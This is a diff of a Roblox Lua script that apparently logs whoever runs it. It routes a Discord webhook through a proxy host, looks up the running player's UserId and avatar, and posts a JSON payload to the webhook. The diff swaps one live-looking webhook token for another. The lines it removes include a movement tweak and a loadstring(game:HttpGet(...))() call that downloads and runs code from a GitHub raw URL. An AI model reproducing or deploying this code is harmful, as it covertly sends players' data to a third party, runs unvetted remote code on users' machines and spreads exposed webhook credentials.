@@ -1,5 +1,4 @@
-
-local discord = "https://discord.com/api/webhooks/1513059320353525891/45J_BqKT84C3zVUQ3_DdewFDvO0WN28DSm4jc26Zx0aaY952zPScRh2_Rz6TgF-8WaiA"
+local discord = "https://discord.com/api/webhooks/1520026886191972566/6gmbXgnzORM8lfaP_jz-kWCR9VlOuN3lmSOoXXQsHTsbUFhoPWZrfoCRnJz-vEYmNBhV"
 
 if not discord or discord == "" then return end
 if discord:find("discord.com") then discord = discord:gsub("discord.com", "webhook.lewisakura.moe") end
@@ -14,7 +13,7 @@ if not r then return end
 
 local pleasework = "https://www.roblox.com/images/PersonalChannel/missing_avatar.png"
 
-
+-- 아바타 이미지 가져오기
 task.spawn(function()
     pcall(function()
         local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png&isCircular=false"
@@ -28,8 +27,7 @@ task.spawn(function()
     end)
 end)
 
-task.wait(1.5)
-
+task.wait(1.0)
 
 local fields = {
     {
@@ -55,37 +53,5 @@ pcall(function()
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode(payload)
     })
-end
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-
-local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-local rootPart = character:WaitForChild("HumanoidRootPart")
-
-local targetAnimSpeed = 1.0
-
-humanoid.AnimationPlayed:Connect(function(animTrack)
-	animTrack:AdjustSpeed(targetAnimSpeed)
 end)
 
-for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
-	track:AdjustSpeed(targetAnimSpeed)
-end
-
-RunService.RenderStepped:Connect(function()
-	if humanoid.MoveDirection.Magnitude > 0 then
-		local moveDir = humanoid.MoveDirection.Unit
-		rootPart.Velocity = Vector3.new(moveDir.X * humanoid.WalkSpeed, rootPart.Velocity.Y, moveDir.Z * humanoid.WalkSpeed)
-	else
-		rootPart.Velocity = Vector3.new(0, rootPart.Velocity.Y, 0)
-	end
-end)
-
-UserInputService.JumpRequest:Connect(function()
-	humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-end)
-
- loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/papacaca-4-2-1-1-1-1-2.txt1"))()
